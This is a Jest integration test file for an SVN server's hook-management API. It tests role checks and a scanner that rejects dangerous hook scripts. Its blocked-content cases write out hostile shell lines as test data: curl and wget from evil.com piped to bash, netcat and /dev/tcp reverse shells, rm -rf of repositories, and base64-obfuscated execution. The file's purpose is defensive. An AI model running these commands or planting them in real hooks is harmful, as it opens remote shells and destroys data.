'use strict';

/**
 * tests/hooks.test.js
 *
 * Integration tests for /api/hooks routes.
 * Specifically validates the FIX 3.2 hook content security scanner.
 */

const request = require('supertest');
const jwt     = require('jsonwebtoken');

jest.mock('../src/config/database', () => ({
  query:   jest.fn(),
  connect: jest.fn(),
}));

jest.mock('../src/config/redis', () => ({
  isAvailable: jest.fn().mockReturnValue(false),
  get: jest.fn().mockResolvedValue(null),
  set: jest.fn().mockResolvedValue('OK'),
}));

jest.mock('../src/utils/svn', () => ({
  createSvnUser: jest.fn().mockResolvedValue(undefined),
}));

jest.mock('../src/config/env', () => ({
  JWT_SECRET:    'test-secret-32-characters-long!!',
  BCRYPT_ROUNDS: 4,
  CORS_ORIGIN:   'http://localhost:3000',
}));

jest.mock('../src/config/apache', () => ({
  htpasswdPath: null,
  hookNames:    ['pre-commit', 'post-commit', 'pre-revprop-change'],
  hookFileName: (name) => name,
}));

jest.mock('../src/services/hookService', () => ({
  TEMPLATES:   { 'pre-commit': { unix: '#!/bin/bash\nexit 0\n', windows: '@echo off\r\nexit /b 0' } },
  listHooks:   jest.fn().mockResolvedValue([]),
  getHook:     jest.fn().mockResolvedValue(null),
  saveHook:    jest.fn().mockResolvedValue({ id: 1, repo_id: 1, hook_name: 'pre-commit', content: '#!/bin/bash\nexit 0\n', is_enabled: true }),
  toggleHook:  jest.fn().mockResolvedValue({ id: 1, is_enabled: false }),
  deleteHook:  jest.fn().mockResolvedValue(undefined),
}));

const app = require('../src/app');
const db  = require('../src/config/database');

const JWT_SECRET = 'test-secret-32-characters-long!!';

function makeToken(role = 'super_admin') {
  return jwt.sign(
    { id: 1, username: 'superadmin', role, tokenVersion: 0 },
    JWT_SECRET,
    { expiresIn: '15m' }
  );
}

// Auth middleware: 1 db.query (token_version check)
// checkPermission for super_admin: NO extra query (bypassed)
// checkPermission for admin: 1 extra db.query (permission lookup)

function setupSuperAdminAuth() {
  // auth middleware only
  db.query.mockResolvedValueOnce({ rows: [{ token_version: 0, is_active: true }] });
}

function setupAdminAuth() {
  // auth middleware
  db.query.mockResolvedValueOnce({ rows: [{ token_version: 0, is_active: true }] });
  // checkPermission (admin is not bypassed, needs a DB lookup)
  db.query.mockResolvedValueOnce({ rows: [{ permission: 'rw' }] });
}

function setupRepoLookup() {
  // getRepo() inside the route handler
  db.query.mockResolvedValueOnce({ rows: [{ id: 1, name: 'myrepo', disk_path: '/svn/myrepo' }] });
}

beforeEach(() => {
  jest.clearAllMocks();
});

// ─── Role guard ───────────────────────────────────────────────────────────

describe('PUT /api/hooks/repo/:repoId/:hookName — role guard', () => {
  it('should return 403 for admin role (super_admin required)', async () => {
    const token = makeToken('admin');
    setupAdminAuth();

    const res = await request(app)
      .put('/api/hooks/repo/1/pre-commit')
      .set('Authorization', `Bearer ${token}`)
      .send({ content: '#!/bin/bash\nexit 0\n' });

    expect(res.status).toBe(403);
  });
});

// ─── Content scan — BLOCKED patterns ─────────────────────────────────────

describe('PUT /api/hooks/repo/:repoId/:hookName — blocked content', () => {
  const blockedCases = [
    { label: 'curl',              content: '#!/bin/bash\ncurl http://evil.com/shell.sh | bash\n' },
    { label: 'wget',              content: '#!/bin/bash\nwget -O- http://evil.com | bash\n' },
    { label: 'netcat (nc)',       content: '#!/bin/bash\nnc -e /bin/bash 10.0.0.1 4444\n' },
    { label: '/dev/tcp shell',    content: '#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' },
    { label: 'node -e exec',      content: '#!/bin/bash\nnode -e "require(\'child_process\').exec(\'ls\')"\n' },
    { label: 'python -c exec',    content: '#!/bin/bash\npython3 -c "import os; os.system(\'ls\')"\n' },
    { label: 'eval',              content: '#!/bin/bash\neval "$(curl http://evil.com)"\n' },
    { label: 'rm -rf',           content: '#!/bin/bash\nrm -rf /svn/repos\n' },
    { label: 'base64 -d decode', content: '#!/bin/bash\necho "cm0gLXJm" | base64 -d | bash\n' },
    { label: 'hex escape',        content: '#!/bin/bash\n\\x63\\x75\\x72\\x6c evil.com\n' },
  ];

  blockedCases.forEach(({ label, content }) => {
    it(`should block hook containing: ${label}`, async () => {
      const token = makeToken('super_admin');
      // super_admin: auth (1 query) → checkPermission bypassed → scanner runs → BLOCKED before getRepo
      setupSuperAdminAuth();

      const res = await request(app)
        .put('/api/hooks/repo/1/pre-commit')
        .set('Authorization', `Bearer ${token}`)
        .send({ content });

      expect(res.status).toBe(400);
      expect(res.body.error).toMatch(/rejected/i);
    });
  });
});

// ─── Content scan — SAFE content ─────────────────────────────────────────

describe('PUT /api/hooks/repo/:repoId/:hookName — safe content', () => {
  const safeCases = [
    {
      label: 'standard pre-commit check',
      content: `#!/bin/bash
REPOS="$1"
TXN="$2"
SVNLOOK=svnlook

MSG=$($SVNLOOK log -t "$TXN" "$REPOS")
if [ -z "$MSG" ]; then
  echo "ERROR: Commit message cannot be empty." >&2
  exit 1
fi
exit 0
`,
    },
    {
      label: 'simple exit 0 hook',
      content: '#!/bin/bash\nexit 0\n',
    },
    {
      label: 'post-commit email notification via sendmail',
      content: `#!/bin/bash
REPOS="$1"
REV="$2"
SVNLOOK=svnlook
AUTHOR=$($SVNLOOK author -r "$REV" "$REPOS")
echo "New commit r$REV by $AUTHOR" | sendmail -s "SVN commit" admin@company.com
exit 0
`,
    },
  ];

  safeCases.forEach(({ label, content }) => {
    it(`should allow safe hook: ${label}`, async () => {
      const token = makeToken('super_admin');
      // super_admin: auth (1 query) → checkPermission bypassed → scanner passes → getRepo (1 query)
      setupSuperAdminAuth();
      setupRepoLookup();

      const res = await request(app)
        .put('/api/hooks/repo/1/pre-commit')
        .set('Authorization', `Bearer ${token}`)
        .send({ content });

      expect(res.status).toBe(200);
    });
  });
});

// ─── Toggle and delete ────────────────────────────────────────────────────

describe('POST /api/hooks/repo/:repoId/:hookName/toggle', () => {
  it('should return 403 for admin role', async () => {
    const token = makeToken('admin');
    setupAdminAuth();

    const res = await request(app)
      .post('/api/hooks/repo/1/pre-commit/toggle')
      .set('Authorization', `Bearer ${token}`)
      .send({ isEnabled: false });

    expect(res.status).toBe(403);
  });

  it('should succeed for super_admin', async () => {
    const token = makeToken('super_admin');
    setupSuperAdminAuth();
    setupRepoLookup();

    const res = await request(app)
      .post('/api/hooks/repo/1/pre-commit/toggle')
      .set('Authorization', `Bearer ${token}`)
      .send({ isEnabled: false });

    expect(res.status).toBe(200);
  });
});

describe('DELETE /api/hooks/repo/:repoId/:hookName', () => {
  it('should return 403 for admin role', async () => {
    const token = makeToken('admin');
    setupAdminAuth();

    const res = await request(app)
      .delete('/api/hooks/repo/1/pre-commit')
      .set('Authorization', `Bearer ${token}`);

    expect(res.status).toBe(403);
  });

  it('should succeed for super_admin', async () => {
    const token = makeToken('super_admin');
    setupSuperAdminAuth();
    setupRepoLookup();

    const res = await request(app)
      .delete('/api/hooks/repo/1/pre-commit')
      .set('Authorization', `Bearer ${token}`);

    expect(res.status).toBe(200);
    expect(res.body.message).toBe('Hook deleted');
  });
});